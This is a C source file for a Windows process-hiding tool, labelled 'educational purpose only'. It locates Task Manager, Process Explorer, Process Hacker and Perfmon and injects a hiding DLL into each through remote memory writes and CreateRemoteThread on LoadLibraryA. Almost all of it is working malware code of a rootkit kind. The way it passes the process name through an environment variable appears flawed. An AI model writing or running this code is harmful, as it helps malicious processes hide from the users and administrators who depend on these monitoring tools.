/**
 * DLL Injector for Windows Process Hiding - Educational Purpose Only
 * 
 * This utility injects the process hiding DLL into target processes
 * like Task Manager, Process Explorer, etc.
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

#define MAX_TARGETS 5

// List of processes to inject into
const char* TARGET_PROCESSES[MAX_TARGETS] = {
    "taskmgr.exe",      // Windows Task Manager
    "procexp.exe",      // Process Explorer
    "procexp64.exe",    // Process Explorer 64-bit
    "ProcessHacker.exe",// Process Hacker
    "perfmon.exe"       // Performance Monitor
};

// Find a process ID by name
DWORD GetProcessIdByName(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe32));
    }
    
    CloseHandle(snapshot);
    return 0;
}

// Inject DLL into a process
BOOL InjectDLL(DWORD processId, const char* dllPath) {
    HANDLE hProcess;
    LPVOID pRemoteBuf;
    DWORD dwBufSize = strlen(dllPath) + 1;
    LPVOID pLoadLibrary;
    HANDLE hThread;
    
    // Open the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        printf("Failed to open process (PID: %lu) - Error: %lu\n", processId, GetLastError());
        return FALSE;
    }
    
    // Allocate memory in the target process
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteBuf) {
        printf("Failed to allocate memory - Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, dwBufSize, NULL)) {
        printf("Failed to write to process memory - Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Get address of LoadLibraryA function
    pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibrary) {
        printf("Failed to get LoadLibraryA address - Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Create remote thread that calls LoadLibraryA with the DLL path
    hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                (LPTHREAD_START_ROUTINE)pLoadLibrary, 
                                pRemoteBuf, 0, NULL);
    if (!hThread) {
        printf("Failed to create remote thread - Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

int main(int argc, char* argv[]) {
    char dllPath[MAX_PATH];
    char processToHide[MAX_PATH];
    BOOL success = FALSE;
    
    printf("=======================================================\n");
    printf("Windows Process Hiding Tool - EDUCATIONAL PURPOSE ONLY!\n");
    printf("=======================================================\n\n");
    
    if (argc != 2) {
        printf("Usage: %s <process_name_to_hide>\n", argv[0]);
        printf("Example: %s notepad.exe\n", argv[0]);
        return 1;
    }
    
    // Get full path to the DLL
    GetFullPathNameA("win_process_hider.dll", MAX_PATH, dllPath, NULL);
    
    // Set the process to hide
    strncpy(processToHide, argv[1], MAX_PATH-1);
    
    // Set environment variable with the process to hide
    SetEnvironmentVariableA("HIDE_PROCESS", processToHide);
    
    printf("Target process to hide: %s\n", processToHide);
    printf("DLL path: %s\n\n", dllPath);
    
    printf("Injecting into process monitoring utilities...\n");
    
    // Try to inject into all target processes
    for (int i = 0; i < MAX_TARGETS; i++) {
        DWORD pid = GetProcessIdByName(TARGET_PROCESSES[i]);
        if (pid) {
            printf("Found %s (PID: %lu) - ", TARGET_PROCESSES[i], pid);
            if (InjectDLL(pid, dllPath)) {
                printf("Injection successful!\n");
                success = TRUE;
            } else {
                printf("Injection failed.\n");
            }
        } else {
            printf("%s not running.\n", TARGET_PROCESSES[i]);
        }
    }
    
    if (!success) {
        printf("\nNo injections were successful. Make sure to:\n");
        printf("1. Run this tool as Administrator\n");
        printf("2. Start at least one process monitoring tool\n");
    } else {
        printf("\nAt least one injection was successful!\n");
        printf("The process '%s' should now be hidden from injected utilities.\n", processToHide);
    }
    
    printf("\nPress Enter to exit...");
    getchar();
    
    return 0;
}
